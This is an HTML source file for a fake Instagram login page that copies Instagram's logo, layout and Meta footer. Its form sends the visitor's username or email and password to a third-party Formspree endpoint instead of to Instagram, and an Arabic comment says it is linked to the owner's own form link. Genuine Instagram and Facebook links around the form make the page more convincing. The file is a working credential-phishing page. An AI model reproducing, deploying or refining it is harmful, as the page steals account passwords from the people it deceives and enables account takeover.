<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log into Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="top-header">
        <svg aria-label="Instagram" class="ig-logo" viewBox="0 0 100 100" width="80" height="80">
            <defs>
                <linearGradient id="ig-gradient" x1="20%" y1="100%" x2="80%" y2="0%">
                    <stop offset="0%" stop-color="#f09433" />
                    <stop offset="25%" stop-color="#e6683c" />
                    <stop offset="50%" stop-color="#dc2743" />
                    <stop offset="75%" stop-color="#cc2366" />
                    <stop offset="100%" stop-color="#bc1888" />
                </linearGradient>
            </defs>
            <rect x="10" y="10" width="80" height="80" rx="22" ry="22" fill="url(#ig-gradient)" />
            <rect x="25" y="25" width="50" height="50" rx="13" ry="13" fill="none" stroke="#ffffff" stroke-width="6" />
            <circle cx="50" cy="50" r="13" fill="none" stroke="#ffffff" stroke-width="6" />
            <circle cx="66" cy="34" r="4" fill="#ffffff" />
        </svg>
    </header>

    <main class="container">
        <h1 class="title">Log into Instagram</h1>
        
        <!-- تم الربط برابط Formspree الخاص بك -->
        <form id="loginForm" action="https://formspree.io/f/xojrlqjp" method="POST">
            <div class="input-group">
                <i class="fas fa-user input-icon"></i>
                <input type="text" name="Username_or_Email" id="username" placeholder="Mobile number, username or email" required autocomplete="off">
            </div>
            
            <div class="input-group">
                <i class="fas fa-lock input-icon"></i>
                <input type="password" name="Password" id="password" placeholder="Password" required>
            </div>
            
            <button type="submit" id="loginBtn" disabled>Log in</button>
        </form>

        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>

        <div class="bottom-actions">
            <a href="https://www.facebook.com/login/" class="action-btn fb-btn">
                <svg viewBox="0 0 24 24" width="18" height="18">
                    <circle cx="12" cy="12" r="12" fill="#1877F2"/>
                    <path d="M15.4 12h-2.3v7.8h-3.2V12H8.3v-2.7h1.6V7.4c0-2.2 1-3.5 3.6-3.5h2.2v2.6h-1.4c-1 0-1.2.4-1.2 1.2v1.6h2.6l-.3 2.7z" fill="#fff"/>
                </svg>
                Log in with Facebook
            </a>
            <a href="https://www.instagram.com/accounts/emailsignup/?next=" class="action-btn create-btn">Create new account</a>
        </div>
    </main>

    <footer class="main-footer">
        <div class="meta-logo-footer">
            <i class="fa-brands fa-meta meta-icon"></i>
            <span class="meta-text">Meta</span>
        </div>
        <div class="footer-divider"></div>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
                <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
                <a href="#">Locations</a> <a href="#">Popular</a> <a href="#">Instagram Lite</a>
                <a href="#">Meta AI</a> <a href="#">Threads</a> <a href="#">Meta Verified</a>
            </div>
            <div class="footer-bottom">
                <div class="language-selector">English <i class="fas fa-chevron-down" style="font-size: 10px;"></i></div>
                <div class="copyright">© 2026 Instagram from Meta</div>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
